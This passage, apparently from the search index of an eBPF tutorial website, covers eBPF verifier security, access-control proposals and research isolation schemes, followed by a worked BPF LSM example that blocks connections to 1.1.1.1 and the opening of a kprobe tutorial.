data corruption or security breaches. It also safeguards against use-after-free bugs and object leaks, which are common vulnerabilities that can be exploited. In addition to these, it takes into account hardware vulnerabilities like Spectre, enforcing mitigations to prevent such side-channel attacks.</p> <ul> <li><code>Ensuring Type Safety</code></li> </ul> <p>Type safety is another critical aspect that the verifier ensures. By preventing type confusion bugs, it helps maintain the integrity of data within the kernel. The eBPF verifier utilizes BPF Type Format (BTF), which allows it to accurately understand and check the kernel's complex data structures, ensuring that the program's operations on these structures are valid and safe.</p> <ul> <li><code>Preventing Hardware Exceptions</code></li> </ul> <p>Hardware exceptions, such as division by zero, can cause abrupt program terminations and kernel panics. To prevent this, the verifier includes checks for divisions by unknown scalars, ensuring that instructions are rewritten or handled in a manner consistent with aarch64 specifications, which dictate safe handling of such exceptions.</p> <p>Through these mechanisms, the eBPF verifier plays a critical role in maintaining the security and stability of the kernel, making it an indispensable component of the eBPF infrastructure. It not only reinforces the system's defenses but also upholds the integrity of operations that eBPF programs intend to perform, making it a quintessential part of the eBPF ecosystem.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#how-the-ebpf-verifier-works","title":"How the eBPF Verifier Works","text":"<p>The eBPF verifier is essentially a sophisticated simulation engine that exhaustively tests every possible execution path of a given eBPF program. This simulation is not a mere theoretical exercise but a stringent enforcement of security and safety policies in kernel operations.</p> <ul> <li>Follows control flow graph   The verifier begins its analysis by constructing and following the control flow graph (CFG) of the eBPF program. It carefully computes the set of possible states for each instruction, considering the BPF register set and stack. Safety checks are then performed depending on the current instruction context.</li> </ul> <p>One of the critical aspects of this process is register spill/fill tracking for the program's private BPF stack. This ensures that operations involving the stack do not lead to overflows or underflows, which could corrupt data or provide an attack vector.</p> <ul> <li> <p>Back-edges in control flow graph   To effectively manage loops within the eBPF program, the verifier identifies back-edges in the CFG. Bounded loops are handled by simulating all iterations up to a predefined limit, thus guaranteeing that loops will not lead to indefinite execution.</p> </li> <li> <p>Dealing with potentially large number of states   The verifier must manage the complexity that comes with the large number of potential states in a program's execution paths. It employs path pruning logic to compare the current state with prior states, assessing whether the current path is \"equivalent\" to prior paths and has a safe exit. This reduces the overall number of states that need to be considered.</p> </li> <li> <p>Function-by-function verification for state reduction   To streamline the verification process, the verifier conducts a function-by-function analysis. This modular approach allows for a reduction in the number of states that need to be analyzed at any given time, thereby improving the efficiency of the verification.</p> </li> <li> <p>On-demand scalar precision (back-)tracking for state reduction   The verifier uses on-demand scalar precision tracking to reduce the state space further. By back-tracking scalar values when necessary, the verifier can more accurately predict the program's behavior, optimizing its analysis process.</p> </li> <li> <p>Terminates with rejection upon surpassing \u201ccomplexity\u201d threshold   To maintain practical performance, the verifier has a \"complexity\" threshold. If a program's analysis surpasses this threshold, the verifier will terminate the process and reject the program. This ensures that only programs that are within the manageable complexity are allowed to execute, balancing security with system performance.</p> </li> </ul>"},{"location":"tutorials/18-further-reading/ebpf-security/#challenges","title":"Challenges","text":"<p>Despite its thoroughness, the eBPF verifier faces significant challenges:</p> <ul> <li> <p>Attractive target for exploitation when exposed to non-root users   As the verifier becomes more complex, it becomes an increasingly attractive target for exploitation. The programmability of eBPF, while powerful, also means that if an attacker were to bypass the verifier and gain execution within the OS kernel, the consequences could be severe.</p> </li> <li> <p>Reasoning about verifier correctness is non-trivial   Ensuring the verifier's correctness, especially concerning Spectre mitigations, is not a straightforward task. While there is some formal verification in place, it is only partial. Areas such as the Just-In-Time (JIT) compilers and abstract interpretation models are particularly challenging.</p> </li> <li> <p>Occasions where valid programs get rejected   There is sometimes a disconnect between the optimizations performed by LLVM (the compiler infrastructure used to prepare eBPF programs) and the verifier's ability to understand these optimizations, leading to valid programs being erroneously rejected.</p> </li> <li> <p>\"Stable ABI\" for BPF program types   A \"stable ABI\" is vital so that BPF programs running in production do not break upon an OS kernel upgrade. However, maintaining this stability while also evolving the verifier and the BPF ecosystem presents its own set of challenges.</p> </li> <li> <p>Performance vs. security considerations   Finally, the eternal trade-off between performance and security is pronounced in the verification of complex eBPF programs. While the verifier must be efficient to be practical, it also must not compromise on security, as the performance of the programs it is verifying is crucial for modern computing systems.</p> </li> </ul> <p>The eBPF verifier stands as a testament to the ingenuity in modern computing security, navigating the treacherous waters between maximum programmability and maintaining a fortress-like defense at the kernel level.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#other-works-to-improve-verifier","title":"Other works to improve verifier","text":"<ul> <li>Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel: https://www.usenix.org/conference/osdi20/presentation/nelson</li> <li>\"Sound, Precise, and Fast Abstract Interpretation with Tristate Numbers\u201d, Vishwanathan et al. https://arxiv.org/abs/2105.05398</li> <li>\u201cEliminating bugs in BPF JITs using automated formal verification\u201d, Nelson et al. https://arxiv.org/abs/2105.05398</li> <li>\u201cA proof-carrying approach to building correct and flexible BPF verifiers\u201d, Nelson et al. https://linuxplumbersconf.org/event/7/contributions/685/</li> <li>\u201cAutomatically optimizing BPF programs using program synthesis\u201d, Xu et al. https://linuxplumbersconf.org/event/11/contributions/944/</li> <li>\u201cSimple and Precise Static Analysis of Untrusted Linux Kernel Extensions\u201d, Gershuni et al. https://linuxplumbersconf.org/event/11/contributions/951/</li> <li>\u201cAn Analysis of Speculative Type Confusion Vulnerabilities in the Wild\u201d, Kirzner et al. https://www.usenix.org/conference/usenixsecurity21/presentation/kirzner</li> </ul> <p>Together, these works signify a robust and multi-faceted research initiative aimed at bolstering the foundations of eBPF verification, ensuring that it remains a secure and performant tool for extending the capabilities of the Linux kernel.</p> <p>Other reference for you to learn more about eBPF verifier:</p> <ul> <li>BPF and Spectre: Mitigating transient execution attacks: https://popl22.sigplan.org/details/prisc-2022-papers/11/BPF-and-Spectre-Mitigating-transient-execution-attacks</li> </ul>"},{"location":"tutorials/18-further-reading/ebpf-security/#limitations-in-ebpf-access-control","title":"Limitations in eBPF Access Control","text":"<p>After leading Linux distributions, such as Ubuntu and SUSE, have disallowed unprivileged usage of eBPF Socket Filter and CGroup programs, the current eBPF access control model only supports a single permission level. This level necessitates the CAP_SYS_ADMIN capability for all features. However, CAP_SYS_ADMIN carries inherent risks, particularly to containers, due to its extensive privileges.</p> <p>Addressing this, Linux 5.6 introduces a more granular permission system by breaking down eBPF capabilities. Instead of relying solely on CAP_SYS_ADMIN, a new capability, CAP_BPF, is introduced for invoking the bpf syscall. Additionally, installing specific types of eBPF programs demands further capabilities, such as CAP_PERFMON for performance monitoring or CAP_NET_ADMIN for network administration tasks. This structure aims to mitigate certain types of attacks\u2014like altering process memory or eBPF maps\u2014that still require CAP_SYS_ADMIN.</p> <p>Nevertheless, these segregated capabilities are not bulletproof against all eBPF-based attacks, such as Denial of Service (DoS) and information theft. Attackers may exploit these to craft eBPF-based malware specifically targeting containers. The emergence of eBPF in cloud-native applications exacerbates this threat, as users could inadvertently deploy containers that contain untrusted eBPF programs.</p> <p>Compounding the issue, the risks associated with eBPF in containerized environments are not entirely understood. Some container services might unintentionally grant eBPF permissions, for reasons such as enabling filesystem mounting functionality. The existing permission model is inadequate in preventing misuse of these potentially harmful eBPF features within containers.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#cap_bpf","title":"CAP_BPF","text":"<p>Traditionally, almost all BPF actions required CAP_SYS_ADMIN privileges, which also grant broad system access. Over time, there has been a push to separate BPF permissions from these root privileges. As a result, capabilities like CAP_PERFMON and CAP_BPF were introduced to allow more granular control over BPF operations, such as reading kernel memory and loading tracing or networking programs, without needing full system admin rights.</p> <p>However, CAP_BPF's scope is also ambiguous, leading to a perception problem. Unlike CAP_SYS_MODULE, which is well-defined and used for loading kernel modules, CAP_BPF lacks namespace constraints, meaning it can access all kernel memory rather than being container-specific. This broad access is problematic because verifier bugs in BPF programs can crash the kernel, considered a security vulnerability, leading to an excessive number of CVEs (Common Vulnerabilities and Exposures) being filed, even for bugs that are already fixed. This response to verifier bugs creates undue alarm and urgency to patch older kernel versions that may not have been updated.</p> <p>Additionally, some security startups have been criticized for exploiting the fears around BPF's capabilities to market their products, paradoxically using BPF itself to safeguard against the issues they highlight. This has led to a contradictory narrative where BPF is both demonized and promoted as a solution.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#bpf-namespace","title":"bpf namespace","text":"<p>The current security model requires the CAP_SYS_ADMIN capability for iterating BPF object IDs and converting these IDs to file descriptors (FDs). This is to prevent non-privileged users from accessing BPF programs owned by others, but it also restricts them from inspecting their own BPF objects, posing a challenge in container environments.</p> <p>Users can run BPF programs with CAP_BPF and other specific capabilities, yet they lack a generic method to inspect these programs, as tools like bpftool need CAP_SYS_ADMIN. The existing workaround without CAP_SYS_ADMIN is deemed inconvenient, involving SCM_RIGHTS and Unix domain sockets for sharing BPF object FDs between processes.</p> <p>To address these limitations, Yafang Shao proposes introducing a BPF namespace. This would allow users to create BPF maps, programs, and links within a specific namespace, isolating these objects from users in different namespaces. However, objects within a BPF namespace would still be visible to the parent namespace, enabling system administrators to maintain oversight.</p> <p>The BPF namespace is conceptually similar to the PID namespace and is intended to be intuitive. The initial implementation focuses on BPF maps, programs, and links, with plans to extend this to other BPF objects like BTF and bpffs in the future. This could potentially enable container users to trace only the processes within their container without accessing data from other containers, enhancing security and usability in containerized environments.</p> <p>reference:</p> <ul> <li>BPF and security: https://lwn.net/Articles/946389/</li> <li>Cross Container Attacks: The Bewildered eBPF on Clouds https://www.usenix.org/system/files/usenixsecurity23-he.pdf</li> <li>bpf: Introduce BPF namespace: https://lwn.net/Articles/927354/</li> <li>ebpf-running-in-linux-namespaces: https://stackoverflow.com/questions/48815633/ebpf-running-in-linux-namespaces</li> </ul>"},{"location":"tutorials/18-further-reading/ebpf-security/#unprivileged-ebpf","title":"Unprivileged eBPF","text":"<p>The concept of unprivileged eBPF refers to the ability for non-root users to load eBPF programs into the kernel. This feature is controversial due to security implications and, as such, is currently turned off by default across all major Linux distributions. The concern stems from hardware vulnerabilities like Spectre to kernel bugs and exploits, which can be exploited by malicious eBPF programs to leak sensitive data or attack the system.</p> <p>To combat this, mitigations have been put in place for various versions of these vulnerabilities, like v1, v2, and v4. However, these mitigations come at a cost, often significantly reducing the flexibility and performance of eBPF programs. This trade-off makes the feature unattractive and impractical for many users and use cases.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#trusted-unprivileged-bpf","title":"Trusted Unprivileged BPF","text":"<p>In light of these challenges, a middle ground known as \"trusted unprivileged BPF\" is being explored. This approach would involve an allowlist system, where specific eBPF programs that have been thoroughly vetted and deemed trustworthy could be loaded by unprivileged users. This vetting process would ensure that only secure, production-ready programs bypass the privilege requirement, maintaining a balance between security and functionality. It's a step toward enabling more widespread use of eBPF without compromising the system's integrity.</p> <ul> <li> <p>Permissive LSM hooks: Rejected upstream given LSMs enforce further restrictions</p> <p>New Linux Security Module (LSM) hooks specifically for the BPF subsystem, with the intent of offering more granular control over BPF maps and BTF data objects. These are fundamental to the operation of modern BPF applications.</p> <p>The primary addition includes two LSM hooks: bpf_map_create_security and bpf_btf_load_security, which provide the ability to override the default permission checks that rely on capabilities like CAP_BPF and CAP_NET_ADMIN. This new mechanism allows for finer control, enabling policies to enforce restrictions or bypass checks for trusted applications, shifting the decision-making to custom LSM policy implementations.</p> <p>This approach allows for a safer default by not requiring applications to have BPF-related capabilities, which are typically required to interact with the kernel's BPF subsystem. Instead, applications can run without such privileges, with only vetted and trusted cases being granted permission to operate as if they had elevated capabilities.</p> </li> <li> <p>BPF token concept to delegate subset of BPF via token fd from trusted privileged daemon</p> <p>the BPF token, a new mechanism allowing privileged daemons to delegate a subset of BPF functionality to trusted unprivileged applications. This concept enables containerized BPF applications to operate safely within user namespaces\u2014a feature previously unattainable due to security restrictions with CAP_BPF capabilities. The BPF token is created and managed via kernel APIs, and it can be pinned within the BPF filesystem for controlled access. The latest version of the patch ensures that a BPF token is confined to its creation instance in the BPF filesystem to prevent misuse. This addition to the BPF subsystem facilitates more secure and flexible unprivileged BPF operations.</p> </li> <li> <p>BPF signing as gatekeeper: application vs BPF program (no one-size-fits-all)</p> <p>Song Liu has proposed a patch for unprivileged access to BPF functionality through a new device, <code>/dev/bpf</code>. This device controls access via two new ioctl commands that allow users with write permissions to the device to invoke <code>sys_bpf()</code>. These commands toggle the ability of the current task to call <code>sys_bpf()</code>, with the permission state being stored in the <code>task_struct</code>. This permission is also inheritable by new threads created by the task. A new helper function, <code>bpf_capable()</code>, is introduced to check if a task has obtained permission through <code>/dev/bpf</code>. The patch includes updates to documentation and header files.</p> </li> <li> <p>RPC to privileged BPF daemon: Limitations depending on use cases/environment</p> <p>The RPC approach (eg. bpfd) is similar to the BPF token concept, but it uses a privileged daemon to manage the BPF programs. This daemon is responsible for loading and unloading BPF programs, as well as managing the BPF maps. The daemon is also responsible for verifying the BPF programs before loading them. This approach is more flexible than the BPF token concept, as it allows for more fine-grained control over the BPF programs. However, it is also more complex, bring more maintenance challenges and possibilities for single points of failure.</p> </li> </ul> <p>reference</p> <ul> <li>Permissive LSM hooks: https://lore.kernel.org/bpf/20230412043300.360803-1-andrii@kernel.org/</li> <li>BPF token concept: https://lore.kernel.org/bpf/20230629051832.897119-1-andrii@kernel.org/</li> <li>BPF signing using fsverity and LSM gatekeeper: https://www.youtube.com/watch?v=9p4qviq60z8</li> <li>Sign the BPF bytecode: https://lpc.events/event/16/contributions/1357/attachments/1045/1999/BPF%20Signatures.pdf</li> <li>bpfd: https://bpfd.dev/</li> </ul>"},{"location":"tutorials/18-further-reading/ebpf-security/#other-possible-solutions","title":"Other possible solutions","text":"<p>Here are also some research or discussions about how to improve the security of eBPF. Existing works can be roughly divided into three categories: virtualization, Software Fault Isolation (SFI), and formal methods. Use a sandbox like WebAssembly to deploy eBPF programs or run eBPF programs in userspace is also a possible solution.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#moat-towards-safe-bpf-kernel-extension-isolation","title":"MOAT: Towards Safe BPF Kernel Extension (Isolation)","text":"<p>The Linux kernel makes considerable use of Berkeley Packet Filter (BPF) to allow user-written BPF applications to execute in the kernel space. BPF employs a verifier to statically check the security of user-supplied BPF code. Recent attacks show that BPF programs can evade security checks and gain unauthorized access to kernel memory, indicating that the verification process is not flawless. In this paper, we present MOAT, a system that isolates potentially malicious BPF programs using Intel Memory Protection Keys (MPK). Enforcing BPF program isolation with MPK is not straightforward; MOAT is carefully designed to alleviate technical obstacles, such as limited hardware keys and supporting a wide variety of kernel BPF helper functions. We have implemented MOAT in a prototype kernel module, and our evaluation shows that MOAT delivers low-cost isolation of BPF programs under various real-world usage scenarios, such as the isolation of a packet-forwarding BPF program for the memcached database with an average throughput loss of 6%.</p> <p>https://arxiv.org/abs/2301.13421</p> <p>If we must resort to hardware protection mechanisms, is language safety or verification still necessary to protect the kernel and extensions from one another?</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#unleashing-unprivileged-ebpf-potential-with-dynamic-sandboxing","title":"Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing","text":"<p>For safety reasons, unprivileged users today have only limited ways to customize the kernel through the extended Berkeley Packet Filter (eBPF). This is unfortunate, especially since the eBPF framework itself has seen an increase in scope over the years. We propose SandBPF, a software-based kernel isolation technique that dynamically sandboxes eBPF programs to allow unprivileged users to safely extend the kernel, unleashing eBPF's full potential. Our early proof-of-concept shows that SandBPF can effectively prevent exploits missed by eBPF's native safety mechanism (i.e., static verification) while incurring 0%-10% overhead on web server benchmarks.</p> <p>https://arxiv.org/abs/2308.01983</p> <p>It may be conflict with the original design of eBPF, since it's not designed to use sandbox to ensure safety. Why not using webassembly in kernel if you want SFI?</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#kernel-extension-verification-is-untenable","title":"Kernel extension verification is untenable","text":"<p>The emergence of verified eBPF bytecode is ushering in a new era of safe kernel extensions. In this paper, we argue that eBPF\u2019s verifier\u2014the source of its safety guarantees\u2014has become a liability. In addition to the well-known bugs and vulnerabilities stemming from the complexity and ad hoc nature of the in-kernel verifier, we highlight a concerning trend in which escape hatches to unsafe kernel functions (in the form of helper functions) are being introduced to bypass verifier-imposed limitations on expressiveness, unfortunately also bypassing its safety guarantees. We propose safe kernel extension frameworks using a balance of not just static but also lightweight runtime techniques. We describe a design centered around kernel extensions in safe Rust that will eliminate the need of the in-kernel verifier, improve expressiveness, allow for reduced escape hatches, and ultimately improve the safety of kernel extensions</p> <p>https://sigops.org/s/conferences/hotos/2023/papers/jia.pdf</p> <p>It may limits the kernel to load only eBPF programs that are signed by trusted third parties, as the kernel itself can no longer independently verify them. The rust toolchains also has vulnerabilities.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#wasm-bpf-webassembly-ebpf-library-toolchain-and-runtime","title":"Wasm-bpf: WebAssembly eBPF library, toolchain and runtime","text":"<p>Wasm-bpf is a WebAssembly eBPF library, toolchain and runtime allows the construction of eBPF programs into Wasm with little to no changes to the code, and run them cross platforms with Wasm sandbox.</p> <p>It provides a configurable environment with limited eBPF WASI behavior, enhancing security and control. This allows for fine-grained permissions, restricting access to kernel resources and providing a more secure environment. For instance, eBPF programs can be restricted to specific types of useage, such as network monitoring, it can also configure what kind of eBPF programs can be loaded in kernel, what kind of attach event it can access without the need for modify kernel eBPF permission models.</p> <ul> <li>Kubecon talk: https://sched.co/1R2uf</li> <li>Repo: https://github.com/eunomia-bpf/wasm-bpf</li> </ul> <p>It will require additional effort to port the application to WebAssembly. Additionally, Wasm interface of kernel eBPF also need more effort of maintain, as the BPF daemon does.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#bpftime-userspace-ebpf-runtime-for-uprobe-syscall-hook-plugin","title":"<code>bpftime</code>: Userspace eBPF runtime for uprobe &amp; syscall hook &amp; plugin","text":"<p>An userspace eBPF runtime that allows existing eBPF applications to operate in unprivileged userspace using the same libraries and toolchains. It offers Uprobe and Syscall tracepoints for eBPF, with significant performance improvements over kernel uprobe and without requiring manual code instrumentation or process restarts. The runtime facilitates interprocess eBPF maps in userspace shared memory, and is also compatible with kernel eBPF maps, allowing for seamless operation with the kernel's eBPF infrastructure. It includes a high-performance LLVM JIT for various architectures, alongside a lightweight JIT for x86 and an interpreter.</p> <ul> <li>https://arxiv.org/abs/2311.07923</li> <li>Linux Plumbers: https://lpc.events/event/17/contributions/1639/</li> <li>Repo: https://github.com/eunomia-bpf/bpftime</li> </ul> <p>It may only limited to certain eBPF program types and usecases, not a general approach for kernel eBPF.</p>"},{"location":"tutorials/18-further-reading/ebpf-security/#conclusion","title":"Conclusion","text":"<p>As we have traversed the multifaceted domain of eBPF security, it's clear that while eBPF\u2019s verifier provides a robust first line of defense, there are inherent limitations within the current access control model that require attention. We have considered potential solutions from the realms of virtualization, software fault isolation, and formal methods to WebAssembly or userspace eBPF runtime, each offering unique approaches to fortify eBPF against vulnerabilities.</p> <p>However, as with any complex system, new questions and challenges continue to surface. The gaps identified between the theoretical security models and their practical implementation invite continued research and experimentation. The future of eBPF security is not only promising but also demands a collective effort to ensure the technology can be adopted with confidence in its capacity to safeguard systems.</p> <p>We are github.com/eunomia-bpf, build open source projects to make eBPF easier to use, and exploring new technologies, toolchains and runtimes related to eBPF. For those interested in eBPF technology, check out our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial and our tutorials at https://eunomia.dev/tutorials/ for practical understanding and practice.</p> <p>Share on  Share on </p>"},{"location":"tutorials/19-lsm-connect/","title":"eBPF Tutorial by Example 19: Security Detection and Defense using LSM","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool widely used in the Linux kernel. eBPF allows developers to dynamically load, update, and run user-defined code without restarting the kernel or modifying the kernel source code. This feature enables eBPF to provide high flexibility and performance, making it widely applicable in network and system performance analysis. The same applies to eBPF applications in security, and this article will introduce how to use the eBPF LSM (Linux Security Modules) mechanism to implement a simple security check program.</p>"},{"location":"tutorials/19-lsm-connect/#background","title":"Background","text":"<p>LSM has been an official security framework in the Linux kernel since Linux 2.6, and security implementations based on it include SELinux and AppArmor. With the introduction of BPF LSM in Linux 5.7, system developers have been able to freely implement function-level security checks. This article provides an example of limiting access to a specific IPv4 address through the socket connect function using a BPF LSM program. (This demonstrates its high control precision.)</p>"},{"location":"tutorials/19-lsm-connect/#overview-of-lsm","title":"Overview of LSM","text":"<p>LSM (Linux Security Modules) is a framework in the Linux kernel that supports various computer security models. LSM predefines a set of hook points on critical paths related to Linux kernel security, decoupling the kernel from security modules. This allows different security modules to be loaded/unloaded in the kernel freely without modifying the existing kernel code, thus enabling them to provide security inspection features.</p> <p>In the past, using LSM mainly involved configuring existing security modules like SELinux and AppArmor or writing custom kernel modules. However, with the introduction of the BPF LSM mechanism in Linux 5.7, everything changed. Now, developers can write custom security policies using eBPF and dynamically load them into the LSM mount points in the kernel without configuring or writing kernel modules.</p> <p>Some of the hook points currently supported by LSM include:</p> <ul> <li>File open, creation, deletion, and movement;</li> <li>Filesystem mounting;</li> <li>Operations on tasks and processes;</li> <li>Operations on sockets (creating, binding sockets, sending and receiving messages, etc.);</li> </ul> <p>For more hook points, refer to lsm_hooks.h.</p>"},{"location":"tutorials/19-lsm-connect/#verifying-bpf-lsm-availability","title":"Verifying BPF LSM Availability","text":"<p>First, please confirm that your kernel version is higher than 5.7. Next, you can use the following command to check if BPF LSM support is enabled:</p> <pre><code>$ cat /boot/config-$(uname -r) | grep BPF_LSM\nCONFIG_BPF_LSM=y\n</code></pre> <p>If the output contains <code>CONFIG_BPF_LSM=y</code>, BPF LSM is supported. Provided that the above conditions are met, you can use the following command to check if the output includes the <code>bpf</code> option:</p> <pre><code>$ cat /sys/kernel/security/lsm\nndlock,lockdown,yama,integrity,apparmor\n</code></pre> <p>If the output does not include the <code>bpf</code> option (as in the example above), you can modify <code>/etc/default/grub</code>:</p> <pre><code>GRUB_CMDLINE_LINUX=\"lsm=ndlock,lockdown,yama,integrity,apparmor,bpf\"\n</code></pre> <p>Then, update the grub configuration using the <code>update-grub2</code> command (the corresponding command may vary depending on the system), and restart the system.</p>"},{"location":"tutorials/19-lsm-connect/#writing-ebpf-programs","title":"Writing eBPF Programs","text":"<pre><code>// lsm-connect.bpf.c\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n\n#define EPERM 1\n#define AF_INET 2\n\nconst __u32 blockme = 16843009; // 1.1.1.1 -&gt; int\n\nSEC(\"lsm/socket_connect\")\nint BPF_PROG(restrict_connect, struct socket *sock, struct sockaddr *address, int addrlen, int ret)\n{\n    // Satisfying \"cannot override a denial\" rule\n    if (ret != 0)\n    {\n        return ret;\n    }\n\n    // Only IPv4 in this example\n    if (address-&gt;sa_family != AF_INET)\n    {\n        return 0;\n    }\n\n    // Cast the address to an IPv4 socket address\n    struct sockaddr_in *addr = (struct sockaddr_in *)address;\n\n    // Where do you want to go?\n    __u32 dest = addr-&gt;sin_addr.s_addr;\n    bpf_printk(\"lsm: found connect to %d\", dest);\n\n    if (dest == blockme)\n    {\n        bpf_printk(\"lsm: blocking %d\", dest);\n        return -EPERM;\n    }\n    return 0;\n}\n</code></pre> <p>This is eBPF code implemented in C on the kernel side. It blocks all connection operations through a socket to 1.1.1.1. The following information is included:</p> <ul> <li>The <code>SEC(\"lsm/socket_connect\")</code> macro indicates the expected mount point for this program.</li> <li>The program is defined by the <code>BPF_PROG</code> macro (see tools/lib/bpf/bpf_tracing.h for details).</li> <li><code>restrict_connect</code> is the program name required by the <code>BPF_PROG</code> macro.</li> <li><code>ret</code> is the return value of the LSM check program (potential) before the current function on this mount point.</li> </ul> <p>The overall idea of the program is not difficult to understand:</p> <ul> <li>First, if the return value of other security check functions is non-zero (failed), there is no need to check further and the connection is rejected.</li> <li>Next, it determines whether it is an IPv4 connection request and compares the address being connected to with 1.1.1.1.</li> <li>If the requested address is 1.1.1.1, the connection is blocked; otherwise, the connection is allowed.</li> </ul> <p>During the execution of the program, all connection operations through a socket will be output to <code>/sys/kernel/debug/tracing/trace_pipe</code>.</p>"},{"location":"tutorials/19-lsm-connect/#compilation-and-execution","title":"Compilation and Execution","text":"<p>Compile using a container:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Or compile using <code>ecc</code>:</p> <pre><code>$ ecc lsm-connect.bpf.c\nCompiling bpf object...\nPacking ebpf object and config into package.json...\n</code></pre> <p>And run using <code>ecli</code>:</p> <pre><code>sudo ecli run package.json\n</code></pre> <p>Next, open another terminal and try to access 1.1.1.1:</p> <pre><code>$ ping 1.1.1.1\nping: connect: Operation not permitted\n$ curl 1.1.1.1\ncurl: (7) Couldn't connect to server\n$ wget 1.1.1.1\n--2023-04-23 08:41:18--  (try: 2)  http://1.1.1.1/\nConnecting to 1.1.1.1:80... failed: Operation not permitted.\nRetrying.\n</code></pre> <p>At the same time, we can view the output of <code>bpf_printk</code>:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n            ping-7054    [000] d...1  6313.430872: bpf_trace_printk: lsm: found connect to 16843009\n            ping-7054    [000] d...1  6313.430874: bpf_trace_printk: lsm: blocking 16843009\n            curl-7058    [000] d...1  6316.346582: bpf_trace_printk: lsm: found connect to 16843009\n            curl-7058    [000] d...1  6316.346584: bpf_trace_printk: lsm: blocking 16843009\".```\nwget-7061    [000] d...1  6318.800698: bpf_trace_printk: lsm: found connect to 16843009\nwget-7061    [000] d...1  6318.800700: bpf_trace_printk: lsm: blocking 16843009\n</code></pre> <p>Complete source code: https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/19-lsm-connect</p>"},{"location":"tutorials/19-lsm-connect/#summary","title":"Summary","text":"<p>This article introduces how to use BPF LSM to restrict access to a specific IPv4 address through a socket. We can enable the LSM BPF mount point by modifying the GRUB configuration file. In the eBPF program, we define functions using the <code>BPF_PROG</code> macro and specify the mount point using the <code>SEC</code> macro. In the implementation of the function, we follow the principle of \"cannot override a denial\" in the LSM security-checking module and restrict the socket connection request based on the destination address of the request.</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p>"},{"location":"tutorials/19-lsm-connect/#references","title":"References","text":"<ul> <li>https://github.com/leodido/demo-cloud-native-ebpf-day</li> <li>https://aya-rs.dev/book/programs/lsm/#writing-lsm-bpf-program</li> </ul> <p>The original link of this article: https://eunomia.dev/tutorials/19-lsm-connect</p> <p>Share on  Share on </p>"},{"location":"tutorials/2-kprobe-unlink/","title":"eBPF Tutorial by Example 2: Monitoring unlink System Calls with kprobe","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool on the Linux kernel. It allows developers to dynamically load, update, and run user-defined code at runtime.</p> <p>This article is the second part of the eBPF Tutorial by Example, focusing on using kprobe to capture the unlink system call in eBPF. The article will first explain the basic concepts and technical background of kprobes, and then introduce how to use kprobe to capture the unlink system call in eBPF.</p>"},{"location":"tutorials/2-kprobe-unlink/#background-of-kprobes-technology","title":"Background of kprobes Technology","text":"<p>During the debugging process of the kernel or modules, developers often need to know whether certain functions are called, when they are called, whether the execution is correct, and what the input and return values of the functions are. A simple approach is to add log print information to the corresponding functions in the kernel code. However, this approach often requires recompiling the kernel or modules, restarting the device, etc., which is complex and may disrupt the original code execution process.</p> <p>By using the kprobes technology, users can define their own callback functions and dynamically insert probes into almost all functions in the kernel or modules (some functions cannot be probed, such as the kprobes' own implementation functions, which will be explained in detail later). When the kernel execution flow reaches the specified probe function, it will invoke the callback function, allowing the user to collect the desired information. The kernel will then return to the normal execution flow. If the user has collected sufficient information and no longer needs to continue probing, the probes can be dynamically removed. Therefore, the kprobes technology has the advantages of minimal impact on the kernel execution flow and easy operation.</p> <p>The kprobes technology includes three detection methods: kprobe, jprobe, and kretprobe. First, kprobe is the most basic detection method and serves as the basis for the other two. It allows probes to be placed at any position (including within a function). It provides three callback modes for probes: <code>pre_handler</code>, <code>post_handler</code>, and <code>fault_handler</code>. The <code>pre_handler</code> function is called before the probed instruction is executed, the <code>post_handler</code> is called after the probed instruction is completed (note that it is not the probed function), and the <code>fault_handler</code> is called when a memory access error occurs. The jprobe is based on kprobe and is used to obtain the input values of the probed function. Finally, as the name suggests, kretprobe is also based on kprobe and is used to obtain the return values of the probed function.</p> <p>The kprobes technology is not only implemented through software but also requires support from the hardware architecture. This involves CPU exception handling and single-step debugging techniques. The former is used to make the program's execution flow enter the user-registered callback function, and the latter is used to single-step execute the probed instruction. Therefore, not all architectures support kprobes. Currently, kprobes technology supports various architectures, including i386, x86_64, ppc64, ia64, sparc64, arm, ppc, and mips (note that some architecture implementations may not be complete, see the kernel's Documentation/kprobes.txt for details).</p> <p>Features and Usage Restrictions of kprobes:</p> <ol> <li>kprobes allows multiple kprobes to be registered at the same probe position, but jprobe currently does not support this. It is also not allowed to use other jprobe callback functions or the <code>post_handler</code> callback function of kprobe as probe points.</li> <li>In general, any function in the kernel can be probed, including interrupt handlers. However, the functions used to implement kprobes themselves in kernel/kprobes.c and arch/*/kernel/kprobes.c are not allowed to be probed. Additionally, <code>do_page_fault</code> and <code>notifier_call_chain</code> are also not allowed.</li> <li>If an inline function is used as a probe point, kprobes may not be able to guarantee that probe points are registered for all instances of that function. Since gcc may automatically optimize certain functions as inline functions, the desired probing effect may not be achieved.</li> <li>The callback function of a probe point may modify the runtime context of the probed function, such as by modifying the kernel's data structure or saving register information before triggering the prober in the <code>struct pt_regs</code> structure. Therefore, kprobes can be used to install bug fixes or inject fault testing code.</li> <li>kprobes avoids calling the callback function of another probe point again when processing the probe point function. For example, if a probe point is registered on the <code>printk()</code> function and the 